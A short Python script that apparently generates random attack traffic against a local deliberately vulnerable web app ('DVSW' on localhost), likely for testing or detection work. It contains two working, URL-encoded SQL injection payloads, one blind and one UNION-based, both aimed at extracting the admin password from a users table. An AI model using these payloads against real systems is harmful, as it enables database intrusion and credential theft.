import argparse
import random
import time
import requests
# import matplotlib.pyplot as plt

web = "http://localhost:31418"

parser = argparse.ArgumentParser(
    description=
    'Randomly generate requests and exploits for DVSW app'
)

parser.add_argument('--seconds',
   dest='seconds',
   help='number of total requests and exploits')

args = parser.parse_args()
seconds = 180
if args.seconds is not None:
    seconds = int(args.seconds)

options = ["blind sql injection (exploit)", "union sql injection (exploit)"]
urls = {
    "blind sql injection (exploit)": "/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27",
    "union sql injection (exploit)": "/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)"
}
graph = {
    option: [] for option in options
}
timestamp = {
    option: [] for option in options
}


random.seed(int(time.time()))
val = {
    option: 0 for option in options
}

for i in range(1, seconds + 1):
    numpoints = random.randint(0, 5)
    for j in range(numpoints):
        try:
            rnd = random.randint(0, 1)
            val[options[rnd]] += 1
            r = requests.get(web + urls[options[rnd]])
        except Exception as e:
            print("Error... Website probably not live yet.")
            pass
    if i % 5 == 0:
        for option in options:
            if val[option] != 0:
                graph[option].append(val[option])
                timestamp[option].append(i)
        val = {
            option: 0 for option in options
        }
    time.sleep(1)

# for option in options:
#     plt.plot(timestamp[option], graph[option])
# plt.legend(options, loc = 'upper left')
# plt.show()



